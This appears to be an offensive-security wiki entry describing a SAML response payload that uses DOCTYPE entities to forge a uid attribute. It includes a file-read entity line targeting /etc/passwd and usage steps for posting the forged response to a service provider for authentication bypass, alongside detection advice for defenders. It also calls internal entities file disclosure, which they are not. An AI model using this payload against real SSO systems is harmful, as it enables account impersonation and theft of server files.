---
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:32.247319+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - saml
  - xxe
  - injection
validated: true
---

# SAML-Response-XXE-Injection-Example

## Code

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Response [
  <!ENTITY s "s">
  <!ENTITY f1 "f1">
]>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
  Destination="https://idptestbed/Shibboleth.sso/SAML2/POST"
  ID="_04cfe67e596b7449d05755049ba9ec28"
  InResponseTo="_dbbb85ce7ff81905a3a7b4484afb3a4b"
  IssueInstant="2017-12-08T15:15:56.062Z" Version="2.0">
[...]
  <saml2:Attribute FriendlyName="uid"
    Name="urn:oid:0.9.2342.19200300.100.1.1"
    NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
    <saml2:AttributeValue>
      &s;taf&f1;
    </saml2:AttributeValue>
  </saml2:Attribute>
[...]
</saml2p:Response>
```

## Description

This XML code snippet illustrates a SAML 2.0 Response with XXE injection via defined entities in the DOCTYPE declaration. The entities (&s; and &f1;) are referenced in an attribute value, allowing potential file disclosure or data injection when parsed by a vulnerable XML processor. In a real attack, entities can be expanded to reference local files (e.g., <!ENTITY xxe SYSTEM "file:///etc/passwd">) to exfiltrate sensitive information during authentication processing.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| &s; | Internal entity for injecting static strings or chaining | s |
| &f1; | Additional entity for payload construction | f1 |
| Destination | SP's POST endpoint | https://sp.example.com/saml/acs |
| ID | Unique response identifier | _04cfe67e596b7449d05755049ba9ec28 |
| InResponseTo | Matches the AuthnRequest ID | _dbbb85ce7ff81905a3a7b4484afb3a4b |
| IssueInstant | Timestamp of issuance | 2017-12-08T15:15:56.062Z |

## Usage

Embed this structure into a legitimate SAML response intercepted during SSO flow. Modify entities to target specific files or inject forged attributes (e.g., admin role). Base64-encode the full XML and POST to the SP's ACS endpoint using a tool like curl. This is typically used in procedures like [[procedures/SAML-Injection-for-Authentication-Bypass]] after proxy interception.

## Detection

- Monitor XML parsing logs for entity expansion errors or unexpected file reads.
- Validate SAML signatures and reject responses with untrusted DOCTYPE declarations.
- Network logs showing Base64-decoded XML with entity references in SAML POSTs.
- Anomalous attribute values in authentication audits (e.g., concatenated file contents).

## Related

- [[procedures/SAML-Injection-for-Authentication-Bypass]]
- [[tools/Burp-Suite]]
